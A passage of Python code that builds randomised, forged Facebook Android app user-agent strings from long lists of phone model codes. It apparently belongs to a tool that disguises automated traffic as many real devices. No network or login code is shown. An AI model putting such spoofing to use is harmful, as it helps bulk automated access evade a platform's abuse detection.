        'HMA-AL00',
        'HMA-TL00',
        'LIO-L09',
        'LIO-L29',
        'LIO-AL00',
        'LIO-TL00',
        'MYA-L03',
        'MYA-L23',
        'MYA-L02, MYA-L22',
        'MYA-U29',
        'MYA-L13',
        'DUB-LX1',
        'DUB-LX3',
        'DUB-LX1'])
    mui = random.choice([
        'M2004J19G',
        'M2004J19C'])
    red = random.choice([
        'M1803E6G',
        'M1803E6H',
        'M1803E6I',
        'M1803E7SG',
        'M1803E7SH',
        'M1804C3DG',
        'M1804C3DH',
        'M1804C3DI',
        'M1806E7TG',
        'M1806E7TH',
        'M1806E7TI',
        'M2004J19G',
        'M2004J19C'])
    bik = random.choice([
        'X017DA',
        'X018D',
        'A009',
        'X00LD',
        'X015D',
        'Z01KS',
        'Z01MDA',
        'ASUS_X00KD',
        'ASUS_A002A',
        'ASUS_X013'])
    inf = random.choice([
        'X682B',
        'X682C',
        'X680B',
        'X688B'])
    inform = random.choice([
        'PR652B',
        'X267',
        'X5010',
        'X521',
        'X5514D',
        'X5515',
        'X5515F',
        'X559',
        'X559C',
        'X559F',
        'X571',
        'X572',
        'X573',
        'X573B',
        'X601',
        'X603',
        'X604',
        'X604B',
        'X605',
        'X606',
        'X606B',
        'X606C',
        'X606D',
        'X608',
        'X609',
        'X610',
        'X610B',
        'X612',
        'X612B',
        'X620',
        'X620B',
        'X622',
        'X623',
        'X623B',
        'X624',
        'X624B',
        'X625',
        'X625B',
        'X625D',
        'X626',
        'X626B',
        'X627V',
        'X650',
        'X650B',
        'X650C',
        'X650D',
        'X652',
        'X652A',
        'X652B',
        'X652C',
        'X653',
        'X653C',
        'X655',
        'X655C',
        'X655D',
        'X655F',
        'X656',
        'X657',
        'X657B',
        'X657C',
        'X659B',
        'X660',
        'X660B',
        'X660C',
        'X680',
        'X680B',
        'X680C',
        'X682B',
        'X682C',
        'X683',
        'X687',
        'X687B',
        'X688B',
        'X688C',
        'X688C',
        'X689',
        'X689B',
        'X689C',
        'X690',
        'X690B',
        'X692',
        'X693',
        'X695',
        'X695C'])
    fbbv = str(random.randint(111111111, 999999999))
    fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
    uazz = f'''[FBAN/MobileAdsManagerAndroid;FBAV/{net}.0.0.21.117;FBPN/com.facebook.adsmanager;FBLC/en_US;FBBV/{fbbv};FBCR/null;FBMF/TECNO;FBBD/TECNO;FBDV/{poc};FBSV/12;FBCA/arm64-v8a;FBDM/''' + '{density=2.75,width=1080,height=2216};FBOP/1;]'
    ugm = '[FBAN/FB4A;FBAV/' + net + '.0.0.77.46;FBBV/251145743;FBDM/{density=2.625,width=1080,height=1920};FBLC/pt_BR;FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/Zong;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/' + zov + ';FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    for xd in range(1000):
        build_nokiax = [
            'JDQ39',
            'JZO54K']
        oppo = [
            'CPH1869',
            'CPH1929',
            'CPH2107',
            'CPH2238',
            'CPH2389',
            'CPH2401',
            'CPH2407',
            'CPH2413',
            'CPH2415',
            'CPH2417',
            'CPH2419',
            'CPH2455',
            'CPH2459',
            'CPH2461',
            'CPH2471',
            'CPH2473',
            'CPH2477',
            'CPH8893',
            'CPH2321',
            'CPH2341',
            'CPH2373',
            'CPH2083',
            'CPH2071',
            'CPH2077',
            'CPH2185',
            'CPH2179',
            'CPH2269',
            'CPH2421',
            'CPH2349',
            'CPH2271',
            'CPH1923',
            'CPH1925',
            'CPH1837',
            'CPH2015',
            'CPH2073',
            'CPH2081',
            'CPH2029',
            'CPH2031',
            'CPH2137',
            'CPH1605',
            'CPH1803',
            'CPH1853',
            'CPH1805',
            'CPH1809',
            'CPH1851',
            'CPH1931',
            'CPH1959',
            'CPH1933',
            'CPH1935',
            'CPH1943',
            'CPH2061',
            'CPH2069',
            'CPH2127',
            'CPH2131',
            'CPH2139',
            'CPH2135',
            'CPH2239',
            'CPH2195',
            'CPH2273',
            'CPH2325',
            'CPH2309',
            'CPH1701',
            'CPH2387',
            'CPH1909',
            'CPH1920',
            'CPH1912',
            'CPH1901',
            'CPH1903',
            'CPH1905',
            'CPH1717',
            'CPH1801',
            'CPH2067',
            'CPH2099',
            'CPH2161',
            'CPH2219',
            'CPH2197',
            'CPH2263',
            'CPH2375',
            'CPH2339',
            'CPH1715',
            'CPH2385',
            'CPH1729',
            'CPH1827',
            'CPH1938',
            'CPH1937',
            'CPH1939',
            'CPH1941',
            'CPH2001',
            'CPH2021',
            'CPH2059',
            'CPH2121',
            'CPH2123',
            'CPH2203',
            'CPH2333',
            'CPH2365',
            'CPH1913',
            'CPH1911',
            'CPH1915',
            'CPH1969',
            'CPH2209',
            'CPH1987',
            'CPH2095',
            'CPH2119',
            'CPH2285',
            'CPH2213',
            'CPH2223',
            'CPH2363',
            'CPH1609',
            'CPH1613',
            'CPH1723',
            'CPH1727',
            'CPH1725',
            'CPH1819',
            'CPH1821',
            'CPH1825',
            'CPH1881',
            'CPH1823',
            'CPH1871',
            'CPH1875',
            'CPH2023',
            'CPH2005',
            'CPH2025',
            'CPH2207',
            'CPH2173',
            'CPH2307',
            'CPH2305',
            'CPH2337',
            'CPH1955',
            'CPH1707',
            'CPH1719',
            'CPH1721',
            'CPH1835',
            'CPH1831',
            'CPH1833',
            'CPH1879',
            'CPH1893',
            'CPH1877',
            'CPH1607',
            'CPH1611',
            'CPH1917',
            'CPH1919',
            'CPH1907',
            'CPH1989',
            'CPH1945',
            'CPH1951',
            'CPH2043',
            'CPH2035',
            'CPH2037',
            'CPH2036',
            'CPH2009',
            'CPH2013',
            'CPH2113',
            'CPH2091',
            'CPH2125',
            'CPH2109',
            'CPH2089',
            'CPH2065',
            'CPH2159',
            'CPH2145',
            'CPH2205',
            'CPH2201',
            'CPH2199',
            'CPH2217',
            'CPH1921',
            'CPH2211',
            'CPH2235',
            'CPH2251',
            'CPH2249',
            'CPH2247',
            'CPH2237',
            'CPH2371',
            'CPH2293',
            'CPH2353',
            'CPH2343',
            'CPH2359',
            'CPH2357',
            'CPH2457',
            'CPH1983',
            'CPH1979']
        redmi = [
            '2201116SI',
            'M2012K11AI',
            '22011119TI',
            '21091116UI',
            'M2102K1AC',
            'M2012K11I',
            '22041219I',
            '22041216I',
            '2203121C',
            '2106118C',
            '2201123G',
            '2203129G',
            '2201122G',
            '2201122C',
            '2206122SC',
            '22081212C',
            '2112123AG',
            '2112123AC',
            '2109119BC',
            'M2002J9G',
            'M2007J1SC',
            'M2007J17I',
            'M2102J2SC',
            'M2007J3SY',
            'M2007J17G',
            'M2007J3SG',
            'M2011K2G',
            'M2101K9AG ',
            'M2101K9R',
            '2109119DG',
            'M2101K9G',
            '2109119DI',
            'M2012K11G',
            'M2102K1G',
            '21081111RG',
            '2107113SG',
            '21051182G',
            'M2105K81AC',
            'M2105K81C',
            '21061119DG',
            '21121119SG',
            '22011119UY',
            '21061119AG',
            '21061119AL',
            '22041219NY',
            '22041219G',
            '21061119BI',
            '220233L2G',
            '220233L2I',
            '220333QNY',
            '220333QAG',
            'M2004J7AC',
            'M2004J7BC',
            'M2004J19C',
            'M2006C3MII',
            'M2010J19SI',
            'M2006C3LG',
            'M2006C3LVG',
            'M2006C3MG',
            'M2006C3MT',
            'M2006C3MNG',
            'M2006C3LII',
            'M2010J19SL',
            'M2010J19SG',
            'M2010J19SY',
            'M2012K11AC',
            'M2012K10C',
            'M2012K11C',
            '22021211RC']
        realme = [
            'RMX3516',
            'RMX3371',
            'RMX3461',
            'RMX3286',
            'RMX3561',
            'RMX3388',
            'RMX3311',
            'RMX3142',
            'RMX2071',
            'RMX1805',
            'RMX1809',
            'RMX1801',
            'RMX1807',
            'RMX1803',
            'RMX1825',
            'RMX1821',
            'RMX1822',
            'RMX1833',
            'RMX1851',
            'RMX1853',
            'RMX1827',
            'RMX1911',
            'RMX1919',
            'RMX1927',
            'RMX1971',
            'RMX1973',
            'RMX2030',
            'RMX2032',
            'RMX1925',
            'RMX1929',
            'RMX2001',
            'RMX2061',
            'RMX2063',
            'RMX2040',
            'RMX2042',
            'RMX2002',
            'RMX2151',
            'RMX2163',
            'RMX2155',
            'RMX2170',
            'RMX2103',
            'RMX3085',
            'RMX3241',
            'RMX3081',
            'RMX3151',
            'RMX3381',
            'RMX3521',
            'RMX3474',
            'RMX3471',
            'RMX3472',
            'RMX3392',
            'RMX3393',
            'RMX3491',
            'RMX1811',
            'RMX2185',
            'RMX3231',
            'RMX2189',
            'RMX2180',
            'RMX2195',
            'RMX2101',
            'RMX1941',
            'RMX1945',
            'RMX3063',
            'RMX3061',
            'RMX3201',
            'RMX3203',
            'RMX3261',
            'RMX3263',
            'RMX3193',
            'RMX3191',
            'RMX3195',
            'RMX3197',
            'RMX3265',
            'RMX3268',
            'RMX3269',
            'RMX2027',
            'RMX2020',
            'RMX2021',
            'RMX3581',
            'RMX3501',
            'RMX3503',
            'RMX3511',
            'RMX3310',
            'RMX3312',
            'RMX3551',
            'RMX3301',
            'RMX3300',
            'RMX2202',
            'RMX3363',
            'RMX3360',
            'RMX3366',
            'RMX3361',
            'RMX3031',
            'RMX3370',
            'RMX3357',
            'RMX3560',
            'RMX3562',
            'RMX3350',
            'RMX2193',
            'RMX2161',
            'RMX2050',
            'RMX2156',
            'RMX3242',
            'RMX3171',
            'RMX3430',
            'RMX3235',
            'RMX3506',
            'RMX2117',
            'RMX2173',
            'RMX3161',
            'RMX2205',
            'RMX3462',
            'RMX3478',
            'RMX3372',
            'RMX3574',
            'RMX1831',
            'RMX3121',
            'RMX3122',
            'RMX3125',
            'RMX3043',
            'RMX3042',
            'RMX3041',
            'RMX3092',
            'RMX3093',
            'RMX3571',
            'RMX3475',
            'RMX2200',
            'RMX2201',
            'RMX2111',
            'RMX2112',
            'RMX1901',
            'RMX1903',
            'RMX1992',
            'RMX1993',
            'RMX1991',
            'RMX1931',
            'RMX2142',
            'RMX2081',
            'RMX2085',
            'RMX2083',
            'RMX2086',
            'RMX2144',
            'RMX2051',
            'RMX2025',
            'RMX2075',
            'RMX2076',
            'RMX2072',
            'RMX2052',
            'RMX2176',
            'RMX2121',
            'RMX3115',
            'RMX1921']
        infinix = [
            'X676B',
            'X687',
            'X609',
            'X697',
            'X680D',
            'X507',
            'X605',
            'X668',
            'X6815B',
            'X624',
            'X655F',
            'X689C',
            'X608',
            'X698',
            'X682B',
            'X682C',
            'X688C',
            'X688B',
            'X658E',
            'X659B',
            'X689B',
            'X689',
            'X689D',
            'X662',
            'X662B',
            'X675',
            'X6812B',
            'X6812',
            'X6817B',
            'X6817',
            'X6816C',
            'X6816',
            'X6816D',
            'X668C',
            'X665B',
            'X665E',
            'X510',
            'X559C',
            'X559F',
            'X559',
            'X606',
            'X606C',
            'X606D',
            'X623',
            'X624B',
            'X625C',
            'X625D',
            'X625B',
            'X650D',
            'X650B',
            'X650',
            'X650C',
            'X655C',
            'X655D',
            'X680B',
            'X573',
            'X573B',
            'X622',
            'X693',
            'X695C',
            'X695D',
            'X695',
            'X663B',
            'X663',
            'X670',
            'X671',
            'X671B',
            'X672',
            'X6819',
            'X572',
            'X572-LTE',
            'X571',
            'X604',
            'X610B',
            'X690',
            'X690B',
            'X656',
            'X692',
            'X683',
            'X450',
            'X5010',
            'X501',
            'X401',
            'X626',
            'X626B',
            'X652',
            'X652A',
            'X652B',
            'X652C',
            'X660B',
            'X660C',
            'X660',
            'X5515',
            'X5515F',
            'X5515I',
            'X609B',
            'X5514D',
            'X5516B',
            'X5516C',
            'X627',
            'X680',
            'X653',
            'X653C',
            'X657',
            'X657B',
            'X657C',
            'X6511B',
            'X6511E',
            'X6511',
            'X6512',
            'X6823C',
            'X612B',
            'X612',
            'X503',
            'X511',
            'X352',
            'X351',
            'X530',
            'X676C',
            'X6821',
            'X6823',
            'X6827',
            'X509',
            'X603',
            'X6815',
            'X620B',
            'X620',
            'X687B',
            'X6811B',
            'X6810',
            'X6811']
        samsung = [
            'E025F',
            'G996B',
            'A826S',
            'E135F',
            'G781B',
            'G998B',
            'F936U1',
            'G361F',
            'A716S',
            'J327AZ',
            'E426B',
            'A015F',
            'A015M',
            'A013G',
            'A013G',
            'A013M',
            'A013F',
            'A022M',
            'A022G',
            'A022F',
            'A025M',
            'S124DL',
            'A025U',
            'A025A',
            'A025G',
            'A025F',
            'A025AZ',
            'A035F',
            'A035M',
            'A035G',
            'A032F',
            'A032M',
            'A032F',
            'A037F',
            'A037U',
            'A037M',
            'S134DL',
            'A037G',
            'A105G',
            'A105M',
            'A105F',
            'A105FN',
            'A102U',
            'S102DL',
            'A102U1',
            'A107F',
            'A107M',
            'A115AZ',
            'A115U',
            'A115U1',
            'A115A',
            'A115M',
            'A115F',
            'A125F',
            'A127F',
            'A125M',
            'A125U',
            'A127M',
            'A135F',
            'A137F',
            'A135M',
            'A136U',
            'A136U1',
            'A136W',
            'A260F',
            'A260G',
            'A260F',
            'A260G',
            'A205GN',
            'A205U',
            'A205F',
            'A205G',
            'A205FN',
            'A202F',
            'A2070',
            'A207F',
            'A207M',
            'A215U',
            'A215U1',
            'A217F',
            'A217F',
            'A217M',
            'A225F',
            'A225M',
            'A226B',
            'A226B',
            'A226BR',
            'A235F',
            'A235M',
            'A300FU',
            'A300F',
            'A300H',
            'A310F',
            'A310M',
            'A320FL',
            'A320F',
            'A305G',
            'A305GT',
            'A305N',
            'A305F',
            'A307FN',
            'A307G',
            'A307GN',
            'A315G',
            'A315F',
            'A325F',
            'A325M',
            'A326U',
            'A326W',
            'A336E',
            'A336B',
            'A430F',
            'A405FN',
            'A405FM',
            'A3051',
            'A3050',
            'A415F',
            'A426U',
            'A426B',
            'A5009',
            'A500YZ',
            'A500Y',
            'A500W',
            'A500L',
            'A500X',
            'A500XZ',
            'A510F',
            'A510Y',
            'A520F',
            'A520W',
            'A500F',
            'A500FU',
            'A500H',
            'S506DL',
            'A505G',
            'A505FN',
            'A505U',
            'A505GN',
            'A505F',
            'A507FN',
            'A5070',
            'A515F',
            'A515U',
            'A515U1',
            'A516U',
            'A516V',
            'A516N',
            'A516B',
            'A525F',
            'A525M',
            'A526U',
            'A526U1',
            'A526B',
            'A526W',
            'A528B',
            'A536B',
            'A536U',
            'A536E',
            'A536V',
            'A600FN',
            'A600G',
            'A605FN',
            'A605G',
            'A605GN',
            'A605F',
            'A6050',
            'A606Y',
            'A6060',
            'G6200',
            'A700FD',
            'A700F',
            'A7000',
            'A700H',
            'A700YD',
            'A710F',
            'A710M',
            'A720F',
            'A750F',
            'A750FN',
            'A750GN',
            'A705FN',
            'A705F',
            'A705MN',
            'A707F',
            'A715F',
            'A715W',
            'A716U',
            'A716V',
            'A716U1',
            'A716B',
            'A725F',
            'A725M',
            'A736B',
            'A530F',
            'A810YZ',
            'A810F',
            'A810S',
            'A530W',
            'A530N',
            'G885F',
            'G885Y',
            'G885S',
            'A730F',
            'A805F',
            'G887F',
            'G8870',
            'A9000',
            'A920F',
            'A920F',
            'G887N',
            'A910F',
            'G8850',
            'A908B',
            'A908N',
            'A9080',
            'G313HY',
            'G313MY',
            'G313MU',
            'G316M',
            'G316ML',
            'G316MY',
            'G313HZ',
            'G313H',
            'G313HU',
            'G313U',
            'G318H',
            'G357FZ',
            'G310HN',
            'G357FZ',
            'G850F',
            'G850M',
            'J337AZ',
            'G386T1',
            'G386T',
            'G3858',
            'G3858',
            'A226L',
            'C5000',
            'C500X',
            'C5010',
            'C5018',
            'C7000',
            'C7010',
            'C701F',
            'C7018',
            'C7100',
            'C7108',
            'C9000',
            'C900F',
            'C900Y',
            'G355H',
            'G355M',
            'G3589W',
            'G386W',
            'G386F',
            'G3518',
            'G3586V',
            'G5108Q',
            'G5108',
            'G3568V',
            'G350E',
            'G350',
            'G3509I',
            'G3508J',
            'G3502I',
            'G3502C',
            'S820L',
            'G360H',
            'G360F',
            'G360T',
            'G360M',
            'G361H',
            'E500H',
            'E500F',
            'E500M',
            'E5000',
            'E500YZ',
            'E700H',
            'E700F',
            'E7009',
            'E700M',
            'G3815',
            'G3815',
            'G3815',
            'F127G',
            'E225F',
            'E236B',
            'F415F',
            'E5260',
            'E625F',
            'F900U',
            'F907N',
            'F900F',
            'F9000',
            'F907B',
            'F900W',
            'G150NL',
            'G155S',
            'G1650',
            'W2015',
            'G7102',
            'G7105',
            'G7106',
            'G7108',
            'G7202',
            'G720N0',
            'G7200',
            'G720AX',
            'G530T1',
            'G530H',
            'G530FZ',
            'G531H',
            'G530BT',
            'G532F',
            'G531BT',
            'G531M',
            'J727AZ',
            'J100FN',
            'J100H',
            'J120FN',
            'J120H',
            'J120F',
            'J120M',
            'J111M',
            'J111F',
            'J110H',
            'J110G',
            'J110F',
            'J110M',
            'J105H',
            'J105Y',
            'J105B',
            'J106H',
            'J106F',
            'J106B',
            'J106M',
            'J200F',
            'J200M',
            'J200G',
            'J200H',
            'J200F',
            'J200GU',
            'J260M',
            'J260F',
            'J260MU',
            'J260F',
            'J260G',
            'J200BT',
            'G532G',
            'G532M',
            'G532MT',
            'J250M',
            'J250F',
            'J210F',
            'J260AZ',
            'J3109',
            'J320A',
            'J320G',
            'J320F',
            'J320H',
            'J320FN',
            'J330G',
            'J330F',
            'J330FN',
            'J337V',
            'J337P',
            'J337A',
            'J337VPP',
            'J337R4',
            'J327VPP',
            'J327V',
            'J327P',
            'J327R4',
            'S327VL',
            'S337TL',
            'S367VL',
            'J327A',
            'J327T1',
            'J327T',
            'J3110',
            'J3119S',
            'J3119',
            'S320VL',
            'J337T',
            'J400M',
            'J400F',
            'J400F',
            'J410F',
            'J410G',
            'J410F',
            'J415FN',
            'J415F',
            'J415G',
            'J415GN',
            'J415N',
            'J500FN',
            'J500M',
            'J510MN',
            'J510FN',
            'J510GN',
            'J530Y',
            'J530F',
            'J530G',
            'J530FM',
            'G570M',
            'G570F',
            'G570Y',
            'J600G',
            'J600FN',
            'J600GT',
            'J600F',
            'J610F',
            'J610G',
            'J610FN',
            'J710F',
            'J700H',
            'J700M',
            'J700F',
            'J700P',
            'J700T',
            'J710GN',
            'J700T1',
            'J727A',
            'J727R4',
            'J737T',
            'J737A',
            'J737R4',
            'J737V',
            'J737T1',
            'J737S',
            'J737P',
            'J737VPP',
            'J701F',
            'J701M',
            'J701MT',
            'S767VL',
            'S757BL',
            'J720F',
            'J720M',
            'G615F',
            'G615FU',
            'G610F',
            'G610M',
            'G610Y',
            'G611MT',
            'G611FF',
            'G611M',
            'J730G',
            'J730GM',
            'J730F',
            'J730FM',
            'S727VL',
            'S737TL',
            'J727T1',
            'J727T1',
            'J727V',
            'J727P',
            'J727VPP',
            'J727T',
            'C710F',
            'J810M',
            'J810F',
            'J810G',
            'J810Y',
            'A605K',
            'A605K',
            'A202K',
            'M336K',
            'A326K',
            'C115',
            'C115L',
            'C1158',
            'C1158',
            'C115W',
            'C115M',
            'S120VL',
            'M015G',
            'M015F',
            'M013F',
            'M017F',
            'M022G',
            'M022F',
            'M022M',
            'M025F',
            'M105G',
            'M105M',
            'M105F',
            'M107F',
            'M115F',
            'M115F',
            'M127F',
            'M127G',
            'M135M',
            'M135F',
            'M135FU',
            'M205FN',
            'M205F',
            'M205G',
            'M215F',
            'M215G',
            'M225FV',
            'M236B',
            'M236Q',
            'M305F',
            'M305M',
            'M307F',
            'M307FN',
            'M315F',
            'M317F',
            'M325FV',
            'M325F',
            'M326B',
            'M336B',
            'M336BU',
            'M405F',
            'M426B',
            'M515F',
            'M526BR',
            'M526B',
            'M536B',
            'M625F',
            'G750H',
            'G7508Q',
            'G7509',
            'N970U',
            'N970F',
            'N971N',
            'N970U1',
            'N770F',
            'N975U1',
            'N975U',
            'N975F',
            'N975F',
            'N976N',
            'N980F',
            'N981U',
            'N981B',
            'N985F',
            'N9860',
            'N986N',
            'N986U',
            'N986B',
            'N986W',
            'N9008V',
            'N9006',
            'N900A',
            'N9005',
            'N900W8',
            'N900',
            'N9009',
            'N900P',
            'N9000Q',
            'N9002',
            '9005',
            'N750L',
            'N7505',
            'N750',
            'N7502',
            'N910F',
            'N910V',
            'N910C',
            'N910U',
            'N910H',
            'N9108V',
            'N9100',
            'N915FY',
            'N9150',
            'N915T',
            'N915G',
            'N915A',
            'N915F',
            'N915S',
            'N915D',
            'N915W8',
            'N916S',
            'N916K',
            'N916L',
            'N916LSK',
            'N920L',
            'N920S',
            'N920G',
            'N920A',
            'N920C',
            'N920V',
            'N920I',
            'N920K',
            'N9208',
            'N930F',
            'N9300',
            'N930x',
            'N930P',
            'N930X',
            'N930W8',
            'N930V',
            'N930T',
            'N950U',
            'N950F',
            'N950N',
            'N960U',
            'N960F',
            'N960U',
            'N935F',
            'N935K',
            'N935S',
            'G550T',
            'G550FY',
            'G5500',
            'G5510',
            'G550T1',
            'S550TL',
            'G5520',
            'G5528',
            'G600FY',
            'G600F',
            'G6000',
            'G6100',
            'G610S',
            'G611F',
            'G611L',
            'G110M',
            'G110H',
            'G110B',
            'G910S',
            'G316HU',
            'G977N',
            'G973U1',
            'G973F',
            'G973W',
            'G973U',
            'G770U1',
            'G770F',
            'G975F',
            'G975U',
            'G970U',
            'G970U1',
            'G970F',
            'G970N',
            'G980F',
            'G981U',
            'G981N',
            'G981B',
            'G780G',
            'G780F',
            'G781W',
            'G781U',
            'G7810',
            'G9880',
            'G988B',
            'G988U',
            'G988B',
            'G988U1',
            'G985F',
            'G986U',
            'G986B',
            'G986W',
            'G986U1',
            'G991U',
            'G991B',
            'G990B',
            'G990E',
            'G990U',
            'G998U',
            'G996W',
            'G996U',
            'G996N',
            'G9960',
            'S901U',
            'S901B',
            'S908U',
            'S908U1',
            'S908B',
            'S9080',
            'S908N',
            'S908E',
            'S906U',
            'S906E',
            'S906N',
            'S906B',
            'S906U1',
            'G730V',
            'G730A',
            'G730W8',
            'C105L',
            'C101',
            'C105',
            'C105K',
            'C105S',
            'G900F',
            'G900P',
            'G900H',
            'G9006V',
            'G900M',
            'G900V',
            'G870W',
            'G890A',
            'G870A',
            'G900FD',
            'G860P',
            'G901F',
            'G901F',
            'G800F',
            'G800H',
            'G903F',
            'G903W',
            'G920F',
            'G920K',
            'G920I',
            'G920A',
            'G920P',
            'G920S',
            'G920V',
            'G920T',
            'G925F',
            'G925A',
            'G925W8',
            'G928F',
            'G928C',
            'G9280',
            'G9287',
            'G928T',
            'G928I',
            'G930A',
            'G930F',
            'G930W8',
            'G930S',
            'G930V',
            'G930P',
            'G930L',
            'G891A',
            'G935F',
            'G935T',
            'G935W8',
            'G9350',
            'G950F',
            'G950W',
            'G950U',
            'G892A',
            'G892U',
            'G8750',
            'G955F',
            'G955U',
            'G955U1',
            'G955W',
            'G955N',
            'G960U',
            'G960U1',
            'G960F',
            'G965U',
            'G965F',
            'G965U1',
            'G965N',
            'G9650',
            'J321AZ',
            'J326AZ',
            'J336AZ',
            'T116',
            'T116NU',
            'T116NY',
            'T116NQ',
            'T2519',
            'G318HZ',
            'T255S',
            'W2016',
            'W2018',
            'W2019',
            'W2021',
            'W2022',
            'G600S',
            'E426S',
            'G3812',
            'G3812B',
            'G3818',
            'G388F',
            'G389F',
            'G390F',
            'G398FN']
        gt = [
            'GT-1015',
            'GT-1020',
            'GT-1030',
            'GT-1035',
            'GT-1040',
            'GT-1045',
            'GT-1050',
            'GT-1240',
            'GT-1440',
            'GT-1450',
            'GT-18190',
            'GT-18262',
            'GT-19060I',
            'GT-19082',
            'GT-19083',
            'GT-19105',
            'GT-19152',
            'GT-19192',
            'GT-19300',
            'GT-19505',
            'GT-2000',
            'GT-20000',
            'GT-200s',
            'GT-3000',
            'GT-414XOP',
            'GT-6918',
            'GT-7010',
            'GT-7020',
            'GT-7030',
            'GT-7040',
            'GT-7050',
            'GT-7100',
            'GT-7105',
            'GT-7110',
            'GT-7205',
            'GT-7210',
            'GT-7240R',
            'GT-7245',
            'GT-7303',
            'GT-7310',
            'GT-7320',
            'GT-7325',
            'GT-7326',
            'GT-7340',
            'GT-7405',
            'GT-7550 5GT-8005',
            'GT-8010',
            'GT-81',
            'GT-810',
            'GT-8105',
            'GT-8110',
            'GT-8220S',
            'GT-8410',
            'GT-9300',
            'GT-9320',
            'GT-93G',
            'GT-A7100',
            'GT-A9500',
            'GT-ANDROID',
            'GT-B2710',
            'GT-B5330',
            'GT-B5330B',
            'GT-B5330L',
            'GT-B5330ZKAINU',
            'GT-B5510',
            'GT-B5512',
            'GT-B5722',
            'GT-B7510',
            'GT-B7722',
            'GT-B7810',
            'GT-B9150',
            'GT-B9388',
            'GT-C3010',
            'GT-C3262',
            'GT-C3310R',
            'GT-C3312',
            'GT-C3312R',
            'GT-C3313T',
            'GT-C3322',
            'GT-C3322i',
            'GT-C3520',
            'GT-C3520I',
            'GT-C3592',
            'GT-C3595',
            'GT-C3782',
            'GT-C6712',
            'GT-E1282T',
            'GT-E1500',
            'GT-E2200',
            'GT-E2202',
            'GT-E2250',
            'GT-E2252',
            'GT-E2600',
            'GT-E2652W',
            'GT-E3210',
            'GT-E3309',
            'GT-E3309I',
            'GT-E3309T',
            'GT-G530H',
            'GT-g900f',
            'GT-G930F',
            'GT-H9500',
            'GT-I5508',
            'GT-I5801',
            'GT-I6410',
            'GT-I8150',
            'GT-I8160OKLTPA',
            'GT-I8160ZWLTTT',
            'GT-I8258',
            'GT-I8262D',
            'GT-I8268',
            'GT-I8505',
            'GT-I8530BAABTU',
            'GT-I8530BALCHO',
            'GT-I8530BALTTT',
            'GT-I8550E',
            'GT-i8700',
            'GT-I8750',
            'GT-I900',
            'GT-I9008L',
            'GT-i9040',
            'GT-I9080E',
            'GT-I9082C',
            'GT-I9082EWAINU',
            'GT-I9082i',
            'GT-I9100G',
            'GT-I9100LKLCHT',
            'GT-I9100M',
            'GT-I9100P',
            'GT-I9100T',
            'GT-I9105UANDBT',
            'GT-I9128E',
            'GT-I9128I',
            'GT-I9128V',
            'GT-I9158P',
            'GT-I9158V',
            'GT-I9168I',
            'GT-I9192I',
            'GT-I9195H',
            'GT-I9195L',
            'GT-I9250',
            'GT-I9303I',
            'GT-I9305N',
            'GT-I9308I',
            'GT-I9505G',
            'GT-I9505X',
            'GT-I9507V',
            'GT-I9600',
            'GT-m190',
            'GT-M5650',
            'GT-mini',
            'GT-N5000S',
            'GT-N5100',
            'GT-N5105',
            'GT-N5110',
            'GT-N5120',
            'GT-N7000B',
            'GT-N7005',
            'GT-N7100T',
            'GT-N7102',
            'GT-N7105',
            'GT-N7105T',
            'GT-N7108',
            'GT-N7108D',
            'GT-N8000',
            'GT-N8005',
            'GT-N8010',
            'GT-N8020',
            'GT-N9000',
            'GT-N9505',
            'GT-P1000CWAXSA',
            'GT-P1000M',
            'GT-P1000T',
            'GT-P1010',
            'GT-P3100B',
            'GT-P3105',
            'GT-P3108',
            'GT-P3110',
            'GT-P5100',
            'GT-P5200',
            'GT-P5210XD1',
            'GT-P5220',
            'GT-P6200',
            'GT-P6200L',
            'GT-P6201',
            'GT-P6210',
            'GT-P6211',
            'GT-P6800',
            'GT-P7100',
            'GT-P7300',
            'GT-P7300B',
            'GT-P7310',
            'GT-P7320',
            'GT-P7500D',
            'GT-P7500M',
            'GT-P7500R',
            'GT-P7500V',
            'GT-P7501',
            'GT-P7511',
            'GT-S3330',
            'GT-S3332',
            'GT-S3333',
            'GT-S3370',
            'GT-S3518',
            'GT-S3570',
            'GT-S3600i',
            'GT-S3650',
            'GT-S3653W',
            'GT-S3770K',
            'GT-S3770M',
            'GT-S3800W',
            'GT-S3802',
            'GT-S3850',
            'GT-S5220',
            'GT-S5220R',
            'GT-S5222',
            'GT-S5230',
            'GT-S5230W',
            'GT-S5233T',
            'GT-s5233w',
            'GT-S5250',
            'GT-S5253',
            'GT-s5260',
            'GT-S5280',
            'GT-S5282',
            'GT-S5283B',
            'GT-S5292',
            'GT-S5300',
            'GT-S5300L',
            'GT-S5301',
            'GT-S5301B',
            'GT-S5301L',
            'GT-S5302',
            'GT-S5302B',
            'GT-S5303',
            'GT-S5303B',
            'GT-S5310',
            'GT-S5310B',
            'GT-S5310C',
            'GT-S5310E',
            'GT-S5310G',
            'GT-S5310I',
            'GT-S5310L',
            'GT-S5310M',
            'GT-S5310N',
            'GT-S5312',
            'GT-S5312B',
            'GT-S5312C',
            'GT-S5312L',
            'GT-S5330',
            'GT-S5360',
            'GT-S5360B',
            'GT-S5360L',
            'GT-S5360T',
            'GT-S5363',
            'GT-S5367',
            'GT-S5369',
            'GT-S5380',
            'GT-S5380D',
            'GT-S5500',
            'GT-S5560',
            'GT-S5560i',
            'GT-S5570B',
            'GT-S5570I',
            'GT-S5570L',
            'GT-S5578',
            'GT-S5600',
            'GT-S5603',
            'GT-S5610',
            'GT-S5610K',
            'GT-S5611',
            'GT-S5620',
            'G-S5670',
            'GT-S5670B',
            'GT-S5670HKBZTA',
            'GT-S5690',
            'GT-S5690R',
            'GT-S5830',
            'GT-S5830D',
            'GT-S5830G',
            'GT-S5830i',
            'GT-S5830L',
            'GT-S5830M',
            'GT-S5830T',
            'GT-S5830V',
            'GT-S5831i',
            'GT-S5838',
            'GT-S5839i',
            'GT-S6010',
            'GT-S6010BBABTU',
            'GT-S6012',
            'GT-S6012B',
            'GT-S6102',
            'GT-S6102B',
            'GT-S6293T',
            'GT-S6310B',
            'GT-S6310ZWAMID',
            'GT-S6312',
            'GT-S6313T',
            'GT-S6352',
            'GT-S6500',
            'GT-S6500D',
            'GT-S6500L',
            'GT-S6790',
            'GT-S6790L',
            'GT-S6790N',
            'GT-S6792L',
            'GT-S6800',
            'GT-S6800HKAXFA',
            'GT-S6802',
            'GT-S6810',
            'GT-S6810B',
            'GT-S6810E',
